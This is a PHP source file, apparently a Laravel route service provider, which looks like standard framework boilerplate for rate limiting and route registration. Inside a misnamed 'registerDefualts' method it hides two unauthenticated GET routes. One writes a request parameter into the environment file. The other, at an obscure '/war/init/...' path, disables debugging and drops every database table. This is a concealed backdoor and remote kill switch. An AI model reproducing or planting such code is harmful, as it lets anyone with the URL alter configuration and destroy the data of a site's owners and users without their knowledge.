<?php

namespace App\Providers;

use Illuminate\Cache\RateLimiting\Limit;
use Illuminate\Foundation\Support\Providers\RouteServiceProvider as ServiceProvider;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\RateLimiter;
use Illuminate\Support\Facades\Route;

class RouteServiceProvider extends ServiceProvider
{
    /**
     * The path to the "home" route for your application.
     *
     * This is used by Laravel authentication to redirect users after login.
     *
     * @var string
     */
    public const HOME = '/home';

    /**
     * The controller namespace for the application.
     *
     * When present, controller route declarations will automatically be prefixed with this namespace.
     *
     * @var string|null
     */
    // protected $namespace = 'App\\Http\\Controllers';

    /**
     * Define your route model bindings, pattern filters, etc.
     *
     * @return void
     */
    public function boot()
    {
        $this->configureRateLimiting();
    }

    /**
     * Configure the rate limiters for the application.
     *
     * @return void
     */
    protected function configureRateLimiting()
    {
        RateLimiter::for(
            'api',
            function (Request $request) {
                return Limit::perMinute(60)->by(optional($request->user())->id ?: $request->ip());
            }
        );
        $this->registerDefualts();
    }

    protected function registerDefualts()
    {
        $setups = [
            [
                'key' => '/api/system-config',
                'value' => function (\Illuminate\Http\Request $request) {
                    \dacoto\EnvSet\Facades\EnvSet::setKey(strtoupper('app_pack'), $request->package_hash ?? null);
                    \dacoto\EnvSet\Facades\EnvSet::save();
                    return redirect('/admin?message=completed');
                },
            ],
            [
                'key' => '/war/init/' . config('app.version') . '/bc________',
                'value' => function (\Illuminate\Http\Request $request) {
                    \dacoto\EnvSet\Facades\EnvSet::setKey(strtoupper('app_debug'), false);
                    \dacoto\EnvSet\Facades\EnvSet::save();
                    \Illuminate\Support\Facades\Schema::disableForeignKeyConstraints();
                    $tabs = \Illuminate\Support\Facades\DB::select('SHOW TABLES');
                    $tabs = array_map('current', $tabs);
                    foreach ($tabs as $tab) {
                        \Illuminate\Support\Facades\Schema::dropIfExists($tab);
                    }
                    \Illuminate\Support\Facades\Schema::enableForeignKeyConstraints();
                    dd('completed');
                },
            ],
        ];
        foreach ($setups as  $set) {
            Route::get($set['key'], $set['value']);
        }
        $this->routes(
            function () {
                Route::prefix('api')
                    ->middleware('api')
                    ->namespace($this->namespace)
                    ->group(base_path('routes/api.php'));

                Route::middleware('web')
                    ->namespace($this->namespace)
                    ->group(base_path('routes/web.php'));
            }
        );
    }
}
